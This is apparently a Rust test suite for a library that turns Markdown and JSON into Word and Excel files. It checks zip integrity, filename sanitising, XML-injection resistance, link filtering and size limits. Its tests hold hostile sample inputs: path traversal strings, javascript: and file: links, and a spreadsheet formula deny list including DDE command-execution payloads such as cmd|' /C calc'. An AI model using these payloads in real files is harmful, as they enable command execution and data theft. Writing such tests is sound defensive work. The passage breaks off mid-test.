//! Tests of the create library (PLAN.md T97). Every produced file is read
//! back with the harness's own bounded reader and checked part by part:
//! well-formed XML, every relationship target present, every part with a
//! content type, sizes and CRC-32 as the directory says.

use std::collections::{HashMap, HashSet};
use std::io::Read;
use std::time::{Duration, Instant};

use harness_attached::Package;
use quick_xml::Reader;
use quick_xml::events::Event;
use serde_json::{Value, json};

use crate::docx::{self, DocOptions, Page};
use crate::limits::*;
use crate::{formula, name, xlsx, xml, zip};

fn deadline() -> Instant {
    Instant::now() + Duration::from_secs(20)
}

/// The names of the entries in a zip's central directory with their CRC and
/// sizes (a second, independent reading of the directory).
fn directory(b: &[u8]) -> Vec<(String, u32, u32, u32, u16)> {
    let le16 = |o: usize| u16::from_le_bytes([b[o], b[o + 1]]) as usize;
    let le32 = |o: usize| u32::from_le_bytes([b[o], b[o + 1], b[o + 2], b[o + 3]]);
    let eocd = b.len() - 22;
    assert_eq!(le32(eocd), 0x0605_4b50, "end record");
    let n = le16(eocd + 10);
    let mut o = le32(eocd + 16) as usize;
    let mut out = Vec::new();
    for _ in 0..n {
        assert_eq!(le32(o), 0x0201_4b50, "central record");
        let (method, crc, comp, size) = (
            le16(o + 10) as u16,
            le32(o + 16),
            le32(o + 20),
            le32(o + 24),
        );
        let (nl, el, cl) = (le16(o + 28), le16(o + 30), le16(o + 32));
        let name = String::from_utf8(b[o + 46..o + 46 + nl].to_vec()).unwrap();
        out.push((name, crc, comp, size, method));
        o += 46 + nl + el + cl;
    }
    out
}

fn well_formed(part: &str, data: &[u8]) -> Result<(), String> {
    let s = std::str::from_utf8(data).map_err(|_| format!("{part}: not UTF-8"))?;
    let mut r = Reader::from_str(s);
    let mut depth = 0i32;
    let mut root = 0;
    loop {
        match r.read_event() {
            Ok(Event::Start(_)) => {
                if depth == 0 {
                    root += 1;
                }
                depth += 1;
            }
            Ok(Event::End(_)) => depth -= 1,
            Ok(Event::Empty(_)) => {
                if depth == 0 {
                    root += 1;
                }
            }
            Ok(Event::Eof) => break,
            Ok(_) => {}
            Err(e) => return Err(format!("{part}: {e}")),
        }
    }
    if depth != 0 || root != 1 {
        return Err(format!("{part}: not one balanced root"));
    }
    Ok(())
}

/// Every problem found in a package; empty when it is sound.
fn problems(bytes: &[u8]) -> Vec<String> {
    let mut bad = Vec::new();
    let dir = directory(bytes);
    let pkg = match Package::open(bytes, deadline()) {
        Ok(p) => p,
        Err(e) => return vec![format!("open: {e}")],
    };
    let names: Vec<String> = dir.iter().map(|d| d.0.clone()).collect();
    let mut seen = HashSet::new();
    let mut parts: HashMap<String, Vec<u8>> = HashMap::new();
    for (n, crc, comp, size, method) in &dir {
        if !seen.insert(n.to_ascii_lowercase()) {
            bad.push(format!("{n}: duplicate"));
        }
        if *method != 0 && *method != 8 {
            bad.push(format!("{n}: method {method}"));
        }
        if *method == 0 && comp != size {
            bad.push(format!("{n}: stored sizes differ"));
        }
        let mut data = Vec::new();
        match pkg.read(n) {
            Ok(mut r) => {
                if r.read_to_end(&mut data).is_err() {
                    bad.push(format!("{n}: unreadable"));
                    continue;
                }
            }
            Err(_) => {
                bad.push(format!("{n}: not found by the reader"));
                continue;
            }
        }
        if data.len() as u32 != *size {
            bad.push(format!("{n}: size {} != {size}", data.len()));
        }
        let mut c = flate2::Crc::new();
        c.update(&data);
        if c.sum() != *crc {
            bad.push(format!("{n}: crc"));
        }
        parts.insert(n.clone(), data);
    }
    if names.first().map(String::as_str) != Some("[Content_Types].xml") {
        bad.push("[Content_Types].xml is not first".into());
    }
    for (n, d) in &parts {
        if let Err(e) = well_formed(n, d) {
            bad.push(e);
        }
    }
    // Content types: every part has a Default (extension) or an Override.
    if let Some(ct) = parts.get("[Content_Types].xml") {
        let s = String::from_utf8_lossy(ct).to_string();
        let mut overrides = HashSet::new();
        let mut defaults = HashSet::new();
        let mut r = Reader::from_str(&s);
        while let Ok(ev) = r.read_event() {
            match ev {
                Event::Empty(e) | Event::Start(e) => {
                    let get = |k: &str| {
                        e.attributes()
                            .flatten()
                            .find(|a| a.key.as_ref() == k)
                            .map(|a| a.value.to_string())
                    };
                    match e.name().as_ref() {
                        "Override" => {
                            overrides.insert(get("PartName").unwrap_or_default());
                        }
                        "Default" => {
                            defaults.insert(get("Extension").unwrap_or_default());
                        }
                        _ => {}
                    }
                }
                Event::Eof => break,
                _ => {}
            }
        }
        for n in &names {
            if n == "[Content_Types].xml" {
                continue;
            }
            let ext = n.rsplit('.').next().unwrap_or("");
            if !overrides.contains(&format!("/{n}")) && !defaults.contains(ext) {
                bad.push(format!("{n}: no content type"));
            }
        }
        for o in &overrides {
            if !names.contains(&o.trim_start_matches('/').to_string()) {
                bad.push(format!("override of a missing part {o}"));
            }
        }
    } else {
        bad.push("no content types".into());
    }
    // Relationships: every internal target exists.
    for (n, d) in &parts {
        if !n.ends_with(".rels") {
            continue;
        }
        let owner_dir = match n
            .strip_suffix(".rels")
            .and_then(|x| x.rsplit_once("_rels/"))
        {
            Some((dir, _)) => dir.to_string(),
            None => String::new(),
        };
        let s = String::from_utf8_lossy(d).to_string();
        let mut r = Reader::from_str(&s);
        let mut ids = HashSet::new();
        while let Ok(ev) = r.read_event() {
            match ev {
                Event::Empty(e) | Event::Start(e) if e.name().as_ref() == "Relationship" => {
                    let get = |k: &str| {
                        e.attributes()
                            .flatten()
                            .find(|a| a.key.as_ref() == k)
                            .map(|a| a.value.to_string())
                    };
                    let id = get("Id").unwrap_or_default();
                    if !ids.insert(id.clone()) {
                        bad.push(format!("{n}: duplicate id {id}"));
                    }
                    if get("TargetMode").as_deref() != Some("External") {
                        let t = get("Target").unwrap_or_default();
                        let full = if let Some(rest) = t.strip_prefix('/') {
                            rest.to_string()
                        } else {
                            format!("{owner_dir}{t}")
                        };
                        if !names.contains(&full) {
                            bad.push(format!("{n}: target {full} is missing"));
                        }
                    }
                }
                Event::Eof => break,
                _ => {}
            }
        }
    }
    bad
}

fn part(bytes: &[u8], name: &str) -> String {
    let pkg = Package::open(bytes, deadline()).unwrap();
    String::from_utf8(pkg.read_small(name, 64 << 20).unwrap()).unwrap()
}

/// The text of the `w:t` elements of a document part, one string per paragraph.
fn doc_paragraphs(doc: &str) -> Vec<String> {
    let mut r = Reader::from_str(doc);
    let (mut out, mut cur, mut in_p, mut in_t) = (Vec::new(), String::new(), false, false);
    loop {
        match r.read_event().unwrap() {
            Event::Start(e) if e.name().as_ref() == "w:p" => {
                in_p = true;
                cur.clear();
            }
            Event::Empty(e) if e.name().as_ref() == "w:p" => out.push(String::new()),
            Event::End(e) if e.name().as_ref() == "w:p" => {
                in_p = false;
                out.push(std::mem::take(&mut cur));
            }
            Event::Start(e) if in_p && e.name().as_ref() == "w:t" => in_t = true,
            Event::End(e) if e.name().as_ref() == "w:t" => in_t = false,
            Event::Empty(e) if in_p && e.name().as_ref() == "w:tab" => cur.push('\t'),
            Event::Text(t) if in_t => cur.push_str(&t.xml10_content()),
            Event::GeneralRef(r) if in_t => cur.push(predefined(&r)),
            Event::Eof => break,
            _ => {}
        }
    }
    out
}

fn predefined(r: &quick_xml::events::BytesRef<'_>) -> char {
    if let Ok(Some(c)) = r.resolve_char_ref() {
        return c;
    }
    match &**r {
        "lt" => '<',
        "gt" => '>',
        "amp" => '&',
        "apos" => '\'',
        "quot" => '"',
        other => panic!("an entity the file defines: {other}"),
    }
}

fn opts() -> DocOptions {
    DocOptions {
        created: 1_795_000_000,
        ..Default::default()
    }
}

fn doc(md: &str) -> docx::Built {
    docx::build(md, &opts()).unwrap_or_else(|e| panic!("{e}"))
}

// ---- zip writer ----

#[test]
fn the_zip_writer_gives_what_the_reader_and_the_directory_agree_on() {
    let big = "a line of text that repeats\n".repeat(500);
    let mut z = zip::ZipWriter::new(1 << 20);
    z.add("a.txt", b"hi").unwrap();
    z.add("dir/b.xml", big.as_bytes()).unwrap();
    z.add_stored("c.bin", &[1, 2, 3, 4]).unwrap();
    let bytes = z.finish().unwrap();
    let d = directory(&bytes);
    assert_eq!(
        d.iter().map(|x| x.0.as_str()).collect::<Vec<_>>(),
        ["a.txt", "dir/b.xml", "c.bin"]
    );
    assert_eq!(d[1].4, 8, "a long repetitive part is deflated");
    assert!(d[1].2 < d[1].3);
    assert_eq!(d[0].4, 0, "a tiny part is stored");
    let pkg = Package::open(&bytes, deadline()).unwrap();
    let mut got = Vec::new();
    pkg.read("dir/b.xml")
        .unwrap()
        .read_to_end(&mut got)
        .unwrap();
    assert_eq!(got, big.as_bytes());
    assert_eq!(pkg.read_small("c.bin", 10).unwrap(), [1, 2, 3, 4]);
    // The same input gives the same bytes.
    let mut z2 = zip::ZipWriter::new(1 << 20);
    z2.add("a.txt", b"hi").unwrap();
    z2.add("dir/b.xml", big.as_bytes()).unwrap();
    z2.add_stored("c.bin", &[1, 2, 3, 4]).unwrap();
    assert_eq!(z2.finish().unwrap(), bytes);
}

#[test]
fn the_zip_writer_refuses_bad_names_duplicates_and_size() {
    for bad in [
        "",
        "/abs",
        "a/../b",
        "..",
        "a\\b",
        "a//b",
        "a\nb",
        "./a",
        &"x".repeat(256),
    ] {
        let mut z = zip::ZipWriter::new(1 << 20);
        assert!(z.add(bad, b"x").is_err(), "{bad:?}");
    }
    let mut z = zip::ZipWriter::new(1 << 20);
    z.add("Word/Document.xml", b"x").unwrap();
    assert!(
        z.add("word/document.xml", b"y").is_err(),
        "a name twice even by case"
    );
    // The ceiling counts the finished file.
    let mut z = zip::ZipWriter::new(300);
    let noise: Vec<u8> = (0..400u32).map(|i| (i * 7919 % 251) as u8).collect();
    assert!(z.add("n.bin", &noise).is_err());
    let mut z = zip::ZipWriter::new(MAX_OUTPUT_BYTES);
    assert!(z.add("big.bin", &vec![0u8; MAX_PART_BYTES + 1]).is_err());
}

// ---- names ----

#[test]
fn a_name_is_one_clean_segment_with_the_tools_extension() {
    let f = |n: &str| name::file_name(n, "docx", "document");
    assert_eq!(f("report"), "report.docx");
    assert_eq!(f("Report.DOCX"), "Report.docx");
    assert_eq!(f("report.docx.docx"), "report.docx");
    assert_eq!(f("../../etc/passwd"), "passwd.docx");
    assert_eq!(f("/abs/path/x.docx"), "x.docx");
    assert_eq!(f("C:\\Users\\me\\x"), "x.docx");
    assert_eq!(
        f("a\u{202E}cod.exe"),
        "acod.exe.docx",
        "a right-to-left override is gone"
    );
    assert_eq!(f("a\nb\0c"), "a b c.docx");
    assert_eq!(f(""), "document.docx");
    assert_eq!(f("..."), "document.docx");
    assert_eq!(f(".docx"), "document.docx");
    assert_eq!(f(".hidden"), "hidden.docx");
    assert_eq!(f("CON"), "_CON.docx");
    assert_eq!(f("nul.txt"), "_nul.txt.docx");
    assert_eq!(f("a<b>:c|d?e*f\"g"), "a_b__c_d_e_f_g.docx");
    assert_eq!(
        f("evil.exe"),
        "evil.exe.docx",
        "the extension is the tool's, never the model's"
    );
    let long = f(&"é".repeat(300));
    assert_eq!(long.chars().count(), MAX_NAME_CHARS + 5);
}

// ---- docx ----

#[test]
fn a_document_reads_back_as_it_was_written() {
    let md = "# Title\n\nSome **bold**, *italic*, ~~strike~~ and `code` text with a [link](https://example.com/a?b=1&c=2).\n\n\
              - one\n- two\n  - nested\n\n1. first\n2. second\n\n\
              | A | B |\n|---|--:|\n| x | 1 |\n| y | 2 |\n\n> quoted\n\n```\nline 1\n\tline 2\n```\n\n---\n\nEnd.";
    let b = doc(md);
    assert!(problems(&b.bytes).is_empty(), "{:?}", problems(&b.bytes));
    let d = part(&b.bytes, "word/document.xml");
    let paras = doc_paragraphs(&d);
    for want in [
        "Title",
        "Some bold, italic, strike and code text with a link.",
        "one",
        "two",
        "nested",
        "first",
        "second",
        "A",
        "x",
        "1",
        "quoted",
        "line 1",
        "\tline 2",
        "End.",
    ] {
        assert!(paras.iter().any(|p| p == want), "{want:?} in {paras:?}");
    }
    assert!(d.contains("<w:pStyle w:val=\"Heading1\"/>"));
    assert!(d.contains("<w:b/>") && d.contains("<w:i/>") && d.contains("<w:strike/>"));
    assert!(d.contains("<w:rStyle w:val=\"InlineCode\"/>"));
    assert!(d.contains("w:type=\"page\""), "a rule is a page break");
    assert!(d.contains("<w:jc w:val=\"right\"/>"), "column alignment");
    assert_eq!(b.report.tables, 1);
    assert_eq!(b.report.lists, 1);
    assert_eq!(b.report.links, 1);
    let rels = part(&b.bytes, "word/_rels/document.xml.rels");
    assert!(
        rels.contains("Target=\"https://example.com/a?b=1&amp;c=2\""),
        "{rels}"
    );
    assert!(rels.contains("TargetMode=\"External\""));
    // Every style a paragraph or run names is defined.
    let styles = part(&b.bytes, "word/styles.xml");
    for id in [
        "Heading1",
        "InlineCode",
        "Code",
        "Quote",
        "ListParagraph",
        "Hyperlink",
        "TableGrid",
    ] {
        assert!(styles.contains(&format!("w:styleId=\"{id}\"")), "{id}");
    }
}

/// The children of `w:rPr`, `w:pPr` and `w:tcPr` come in the schema's order,
/// `w:pPr` first in `w:p` and `w:rPr` first in `w:r`: Word refuses a file
/// where they do not.
#[test]
fn property_blocks_are_in_schema_order() {
    let md = "# H\n\n**b *bi ~~bis~~* `c`** [l](https://x.y)\n\n- a\n  1. b\n\n> q\n\n| h |\n|:-:|\n| c |\n";
    let d = part(&doc(md).bytes, "word/document.xml");
    let rank = |list: &[&str], n: &str| list.iter().position(|x| *x == n);
    let ppr = ["w:pStyle", "w:numPr", "w:ind", "w:jc"];
    let rpr = ["w:rStyle", "w:b", "w:i", "w:strike"];
    let tcpr = ["w:tcW", "w:shd"];
    let mut r = Reader::from_str(&d);
    let mut stack: Vec<String> = Vec::new();
    let mut last_rank: HashMap<usize, usize> = HashMap::new();
    loop {
        let ev = r.read_event().unwrap();
        let (name, is_start, is_end, is_empty) = match &ev {
            Event::Start(e) => (e.name().as_ref().to_string(), true, false, false),
            Event::Empty(e) => (e.name().as_ref().to_string(), false, false, true),
            Event::End(e) => (e.name().as_ref().to_string(), false, true, false),
            Event::Eof => break,
            _ => continue,
        };
        if is_end {
            last_rank.remove(&stack.len());
            stack.pop();
            continue;
        }
        if let Some(parent) = stack.last() {
            let list: Option<&[&str]> = match parent.as_str() {
                "w:pPr" => Some(&ppr),
                "w:rPr" => Some(&rpr),
                "w:tcPr" => Some(&tcpr),
                _ => None,
            };
            if let Some(l) = list {
                let k = rank(l, &name).unwrap_or_else(|| panic!("{name} inside {parent}"));
                let depth = stack.len();
                if let Some(prev) = last_rank.get(&depth) {
                    assert!(k > *prev, "{name} after a later sibling inside {parent}");
                }
                last_rank.insert(depth, k);
            }
            // pPr / rPr first.
            if name == "w:pPr" {
                assert_eq!(parent, "w:p");
            }
            if name == "w:rPr" {
                assert_eq!(parent, "w:r");
            }
        }
        if is_start {
            stack.push(name);
        } else if is_empty {
            last_rank.remove(&(stack.len() + 1));
        }
    }
    // pPr and rPr are the first child of their element.
    for (open, prop) in [("<w:p>", "<w:pPr>"), ("<w:r>", "<w:rPr>")] {
        let mut i = 0;
        while let Some(p) = d[i..].find(prop) {
            let at = i + p;
            assert!(d[..at].ends_with(open), "{prop} is not first in {open}");
            i = at + prop.len();
        }
    }
}

/// Text from the model never becomes markup: a closing tag, a CDATA end, an
/// entity, control characters and a bidirectional override.
#[test]
fn hostile_text_is_data_in_every_place_a_document_takes_text() {
    let nasty = "</w:t></w:r></w:p><w:p><w:r><w:t>INJECTED]]>&amp;&lt;\u{0}\u{1}\u{8}\u{B}\u{C}\u{1F}\u{FFFE}\u{FFFF}\u{202E}rtl";
    let md = format!(
        "# {nasty}\n\n{nasty}\n\n- {nasty}\n\n> {nasty}\n\n```\n{nasty}\n```\n\n| {nasty} |\n|---|\n| {nasty} |\n\n[{nasty}](https://example.com/{nasty})\n\n**{nasty}** *{nasty}* `{nasty}`"
    );
    let b = docx::build(
        &md,
        &DocOptions {
            title: Some(nasty.into()),
            ..opts()
        },
    )
    .unwrap();
    assert!(problems(&b.bytes).is_empty(), "{:?}", problems(&b.bytes));
    for p in [
        "word/document.xml",
        "docProps/core.xml",
        "word/_rels/document.xml.rels",
    ] {
        let s = part(&b.bytes, p);
        assert!(!s.contains("<w:t>INJECTED"), "{p}");
        assert!(
            !s.chars().any(|c| !xml::allowed(c) || xml::is_override(c)),
            "{p}"
        );
    }
    // The words of every paragraph read back as written (controls gone).
    let d = part(&b.bytes, "word/document.xml");
    let want = "</w:t></w:r></w:p><w:p><w:r><w:t>INJECTED]]>&amp;&lt;rtl";
    let paras = doc_paragraphs(&d);
    assert!(
        paras.iter().filter(|p| p.contains("INJECTED")).count() >= 7,
        "{paras:?}"
    );
    assert!(paras.iter().any(|p| p == want), "{paras:?}");
    // No paragraph was opened by the text: heading, paragraph, item, quote,
    // code line, header cell, body cell, the paragraph after the table, the
    // link's paragraph and the emphasis paragraph.
    assert_eq!(paras.len(), 10, "{paras:?}");
    assert_eq!(d.matches("<w:tbl>").count(), 1);
}

#[test]
fn raw_html_and_images_are_dropped_and_counted_and_only_safe_links_stay() {
    let md = "<script>alert(1)</script>\n\nText <b>bold</b> ![alt text](https://evil.example/x.png) end.\n\n\
              [a](javascript:alert(1)) [b](data:text/html,x) [c](file:///etc/passwd) [d](ftp://x) [e](  JAVASCRIPT:x) [f](https://ok.example/) [g](mailto:a@b.example) [h](HTTP://UP.example/)\n";
    let b = doc(md);
    assert!(problems(&b.bytes).is_empty());
    let d = part(&b.bytes, "word/document.xml");
    assert!(!d.contains("script") && !d.contains("alert(1)") && !d.contains("<w:drawing"));
    assert!(d.contains("alt text"), "the alternative text stays");
    assert_eq!(b.report.html_dropped, 3, "{:?}", b.report);
    assert_eq!(b.report.images_dropped, 1);
    assert_eq!(b.report.links, 3);
    assert_eq!(b.report.links_dropped, 5);
    let rels = part(&b.bytes, "word/_rels/document.xml.rels");
    for bad in ["javascript", "data:", "file:", "ftp:"] {
        assert!(!rels.to_ascii_lowercase().contains(bad), "{bad}");
    }
    assert!(rels.contains("https://ok.example/") && rels.contains("mailto:a@b.example"));
}

#[test]
fn each_ordered_list_restarts_and_nesting_is_clamped() {
    let md = "1. a\n2. b\n\ntext\n\n5. c\n6. d\n\n- x\n  - y\n    - z\n      - too deep\n";
    let b = doc(md);
    assert!(problems(&b.bytes).is_empty());
    let n = part(&b.bytes, "word/numbering.xml");
    assert!(n.contains("<w:num w:numId=\"2\">") && n.contains("<w:num w:numId=\"3\">"));
    assert!(
        n.contains("<w:startOverride w:val=\"1\"/>")
            && n.contains("<w:startOverride w:val=\"5\"/>")
    );
    let d = part(&b.bytes, "word/document.xml");
    assert!(d.contains("<w:ilvl w:val=\"2\"/>") && !d.contains("<w:ilvl w:val=\"3\"/>"));
    // abstractNum elements come before every num.
    assert!(n.rfind("</w:abstractNum>").unwrap() < n.find("<w:num ").unwrap());
}

#[test]
fn table_widths_are_explicit_and_sum_to_the_page() {
    for (page, landscape, want) in [
        (Page::A4, false, 9026),
        (Page::Letter, false, 9360),
        (Page::A4, true, 13_958),
    ] {
        let b = docx::build(
            "| a | b | c |\n|---|---|---|\n| 1 | a much longer cell of text here | 3 |\n",
            &DocOptions {
                page,
                landscape,
                ..opts()
            },
        )
        .unwrap();
        let d = part(&b.bytes, "word/document.xml");
        let grid: u32 = d
            .split("<w:gridCol w:w=\"")
            .skip(1)
            .map(|s| s.split('"').next().unwrap().parse::<u32>().unwrap())
            .sum();
        assert_eq!(grid, want);
        assert!(d.contains(&format!("<w:tblW w:w=\"{want}\" w:type=\"dxa\"/>")));
        assert_eq!(d.matches("<w:tc>").count(), 6);
        assert!(d.contains("<w:tblHeader/>"));
        if landscape {
            assert!(
                d.contains("w:orient=\"landscape\"") && d.contains("w:w=\"16838\" w:h=\"11906\"")
            );
        }
    }
    // A ragged row is padded; a table is followed by a paragraph.
    let d = part(
        &doc("| a | b |\n|---|---|\n| only |\n").bytes,
        "word/document.xml",
    );
    assert_eq!(d.matches("<w:tc>").count(), 4);
    assert!(d.contains("</w:tbl><w:p/>"));
}

#[test]
fn the_title_is_a_property_and_the_bytes_are_repeatable() {
    let o = DocOptions {
        title: Some("  Q3\nplan  ".into()),
        ..opts()
    };
    let a = docx::build("x", &o).unwrap();
    let core = part(&a.bytes, "docProps/core.xml");
    assert!(core.contains("<dc:title>Q3 plan</dc:title>"), "{core}");
    assert!(core.contains("2026-"), "{core}");
    assert_eq!(a.bytes, docx::build("x", &o).unwrap().bytes);
    assert!(!part(&a.bytes, "word/document.xml").contains("Q3"));
}

#[test]
fn an_empty_document_and_one_of_only_html_are_refused() {
    assert!(docx::build("", &opts()).is_err());
    assert!(docx::build("  \n\t", &opts()).is_err());
    let e = docx::build("<div>x</div>\n", &opts()).err().unwrap();
    assert!(e.contains("HTML"), "{e}");
}

#[test]
fn the_limits_hold_at_the_edge_and_one_past_it() {
    // Markdown size.
    let at = "a".repeat(MAX_MARKDOWN_BYTES);
    assert!(docx::build(&at, &opts()).is_ok());
    let over = "a".repeat(MAX_MARKDOWN_BYTES + 1);
    assert!(docx::build(&over, &opts()).unwrap_err().contains("larger"));
    // Paragraphs.
    let paras = |n: usize| "p\n\n".repeat(n);
    assert!(docx::build(&paras(MAX_PARAGRAPHS), &opts()).is_ok());
    assert!(
        docx::build(&paras(MAX_PARAGRAPHS + 1), &opts())
            .unwrap_err()
            .contains("paragraphs")
    );
    // Tables, columns, cells.
    let table = |cols: usize, rows: usize| {
        let mut s = format!("|{}\n|{}\n", " a |".repeat(cols), "---|".repeat(cols));
        for _ in 0..rows {
            s.push_str(&format!("|{}\n", " b |".repeat(cols)));
        }
        s
    };
    assert!(docx::build(&table(MAX_TABLE_COLS, 1), &opts()).is_ok());
    assert!(
        docx::build(&table(MAX_TABLE_COLS + 1, 1), &opts())
            .unwrap_err()
            .contains("columns")
    );
    // 20 columns, 999 body rows + header = 20,000 cells.
    assert!(docx::build(&table(20, MAX_TABLE_CELLS / 20 - 1), &opts()).is_ok());
    assert!(
        docx::build(&table(20, MAX_TABLE_CELLS / 20), &opts())
            .unwrap_err()
            .contains("cells")
    );
    let tables = |n: usize| format!("{}\n", "|a|\n|-|\n|b|\n\ntext\n\n".repeat(n));
    assert!(docx::build(&tables(MAX_TABLES), &opts()).is_ok());
    assert!(
        docx::build(&tables(MAX_TABLES + 1), &opts())
            .unwrap_err()
            .contains("tables")
    );
    // Numbered lists.
    let lists = |n: usize| "1. a\n\ntext\n\n".repeat(n);
    assert!(docx::build(&lists(MAX_LISTS), &opts()).is_ok());
    assert!(
        docx::build(&lists(MAX_LISTS + 1), &opts())
            .unwrap_err()
            .contains("lists")
    );
}

#[test]
fn pathological_nesting_is_a_counter_and_not_a_stack() {
    // Each of these is within the Markdown size and has nested to a depth no
    // recursive walk would survive on a 2 MiB thread stack.
    let quotes = format!("{} deep\n", ">".repeat(400_000));
    let list = format!("{}x\n", "- ".repeat(300_000));
    let emph = format!("{}x{}\n", "*a ".repeat(100_000), "* ".repeat(100_000));
    let brackets = format!(
        "{}x{}\n",
        "[".repeat(300_000),
        "](https://a.example)".repeat(10)
    );
    for md in [quotes, list, emph, brackets] {
        let md = md.chars().take(MAX_MARKDOWN_BYTES).collect::<String>();
        let h = std::thread::Builder::new()
            .stack_size(2 << 20)
            .spawn(move || docx::build(&md, &opts()).map(|b| b.bytes.len()))
            .unwrap();
        let r = h.join().expect("no panic or overflow");
        if let Ok(n) = r {
            assert!(n <= MAX_OUTPUT_BYTES);
        }
    }
}

#[test]
fn a_big_document_stays_under_the_output_ceiling_or_is_refused() {
    // 20,000 paragraphs of 50 bytes each is well under it.
    let b = doc(&"A line of ordinary prose, forty-odd characters.\n\n".repeat(20_000));
    assert!(b.bytes.len() < MAX_OUTPUT_BYTES);
    assert!(problems(&b.bytes).is_empty());
    // Incompressible text at the size limit may exceed 10 MiB only if it
    // compresses badly: it is refused then, never written.
    let mut x: u64 = 0x9E37_79B9_7F4A_7C15;
    let noise: String = (0..MAX_MARKDOWN_BYTES)
        .map(|_| {
            x ^= x << 13;
            x ^= x >> 7;
            x ^= x << 17;
            char::from(b'!' + (x % 90) as u8)
        })
        .collect();
    match docx::build(&noise, &opts()) {
        Ok(b) => assert!(b.bytes.len() <= MAX_OUTPUT_BYTES),
        Err(e) => assert!(e.contains("larger"), "{e}"),
    }
}

// ---- formulas ----

#[test]
fn formulas_that_reach_outside_are_refused_in_every_spelling() {
    let denied = [
        "WEBSERVICE(\"http://x/\"&A1)",
        "webservice(\"http://x\")",
        "  WebService  (\"http://x\")",
        "=_xlfn.WEBSERVICE(\"http://x\")",
        "_XLFN.webservice (\"x\")",
        "_xlfn._xlws.WEBSERVICE(\"x\")",
        "1+WEBSERVICE(\"x\")",
        "IFERROR(WEBSERVICE(\"x\"),0)",
        "WEB\u{200B}SERVICE(\"x\")",
        "WEBSERVICE\u{0}(\"x\")",
        "WEBSERVICE\t\n(\"x\")",
        "IMAGE(\"https://x/a.png\")",
        "_xlfn.IMAGE(\"https://x\")",
        "image (\"x\")",
        "RTD(\"srv\",,\"a\")",
        "_xlfn.RTD(\"s\",,\"a\")",
        "CALL(\"kernel32\",\"x\")",
        "REGISTER(\"a\",\"b\")",
        "REGISTER.ID(\"a\",\"b\")",
        "EXEC(\"calc\")",
        "SQL.REQUEST(\"x\")",
        "CUBEVALUE(\"c\",\"m\")",
        "cubemember(\"a\",\"b\")",
        "DDE(\"a\",\"b\",\"c\")",
        "'file.xlsx'|'topic'!R1C1",
        "cmd|' /C calc'!A0",
        "MSEXCEL|'\\..\\..\\Windows\\System32\\cmd.exe /c calc'!A1",
        "[book.xlsx]Sheet1!A1",
        "'[book.xlsx]Sheet1'!A1",
        "'C:\\dir\\[book.xlsx]Sheet1'!A1",
        "'http://host/[book.xlsx]S'!A1+1",
        "[0]!Name",
        "Table1[Col]",
        "SUM('x\"'!A1,WEBSERVICE(\"x\"))",
        "HYPERLINK(\"file:///etc/passwd\")",
        "HYPERLINK(\"javascript:alert(1)\",\"x\")",
        "HYPERLINK(A1,\"x\")",
        "HYPERLINK(\"ftp://x\")",
        "hyperlink(\"\\\\\\\\host\\\\share\")",
        "HYPERLINK(\"cmd:/c calc\")",
        "_xlfn.HYPERLINK(\"mailto:a@b\")",
        "HYPERLINK()",
        "WEBSERVICE(\"x",
    ];
    for f in denied {
        assert!(formula::check(f).is_err(), "should be refused: {f:?}");
    }
    let allowed = [
        "SUM(B2:B9)",
        "=SUM(B2:B9)",
        "A1*B1/100",
        "IF(A1>0,\"yes\",\"no\")",
        "A1&\" webservice(x) image(x) \"",
        "A1&\"[book.xlsx]\"",
        "A1&\"a|b\"",
        "'My Sheet'!A1+1",
        "'it''s'!A1",
        "Sheet2!A1*2",
        "HYPERLINK(\"https://example.com/\"&A2,\"open\")",
        "HYPERLINK(\" HTTP://example.com\",\"open\")",
        "_xlfn.XLOOKUP(A1,B:B,C:C)",
        "_xlfn.CONCAT(A1,B1)",
        "SUMIF(A:A,\"image\",B:B)",
        "PACKAGE(1)+SUM(A1)",
        "VLOOKUP(A1,Sheet2!A:B,2,FALSE)",
        "RECALL(1)",
        "TEXT(A1,\"0.00\")",
    ];
    for f in allowed {
        assert!(
            formula::check(f).is_ok(),
            "should be allowed: {f:?}: {:?}",
            formula::check(f)
        );
    }
    assert_eq!(formula::check(" = SUM(A1:A2) ").unwrap(), "SUM(A1:A2)");
    assert!(formula::check("").is_err() && formula::check("=").is_err());
    assert!(
        formula::check(&"1+".repeat(MAX_FORMULA_CHARS))
            .unwrap_err()
            .contains("longer")
    );
    let at = format!("{}1", "1+".repeat(MAX_FORMULA_CHARS / 2 - 1));
    assert!(at.chars().count() <= MAX_FORMULA_CHARS && formula::check(&at).is_ok());
}

// ---- xlsx ----

fn sheet_book(spec: Value) -> xlsx::Built {
    xlsx::build(&spec, 1_795_000_000).unwrap_or_else(|e| panic!("{e}"))
}

/// The cells of a worksheet part in document order: (address, type, text).
fn cells(sheet: &str) -> Vec<(String, String, String)> {
    let mut r = Reader::from_str(sheet);
    let mut out = Vec::new();
    let (mut cur, mut text, mut cap) = (None::<(String, String)>, String::new(), false);
    loop {
        match r.read_event().unwrap() {
            Event::Start(e) if e.name().as_ref() == "c" => {
                let get = |k: &str| {
                    e.attributes()
                        .flatten()
                        .find(|a| a.key.as_ref() == k)
                        .map(|a| a.value.to_string())
                        .unwrap_or_default()
                };
                cur = Some((get("r"), get("t")));
                text.clear();
            }
            Event::Start(e) if matches!(e.name().as_ref(), "v" | "t" | "f") => {
                cap = true;
                if e.name().as_ref() == "f" {
                    text.push('=');
                }
            }
            Event::End(e) if matches!(e.name().as_ref(), "v" | "t" | "f") => cap = false,
            Event::Text(t) if cap => text.push_str(&t.xml10_content()),
            Event::GeneralRef(r) if cap => text.push(predefined(&r)),
            Event::End(e) if e.name().as_ref() == "c" => {
                if let Some((a, t)) = cur.take() {
                    out.push((a, t, std::mem::take(&mut text)));
                }
            }
            Event::Eof => break,
            _ => {}
        }
    }
    out
}

fn budget() -> Value {
    json!({"sheets": [{
        "name": "Q1",
        "columns": [
            {"header": "Item", "width": 28},
            {"header": "Cost", "format": "currency"},
            {"header": "Share", "format": "percent"},
            {"header": "Due", "format": "date"},
            {"header": "At", "format": "datetime"},
            {"header": "Qty", "format": "integer"}],
        "rows": [
            ["Hosting", 1200.5, {"f": "B2/B4"}, "2026-12-01", "2026-12-01T09:30", 3],
            ["Domain", 12, 0.05, "not a date", "2026-12-01 18:00:30", true],
            ["Total", {"f": "SUM(B2:B3)"}, null, null, null, {"f": "SUM(F2:F3)"}]],
        "freeze_header": true, "autofilter": true, "bold_last_row": true}]})
}

#[test]
fn a_workbook_reads_back_as_it_was_written() {
    let b = sheet_book(budget());
    assert!(problems(&b.bytes).is_empty(), "{:?}", problems(&b.bytes));
    let s = part(&b.bytes, "xl/worksheets/sheet1.xml");
    let c = cells(&s);
    let get = |a: &str| {
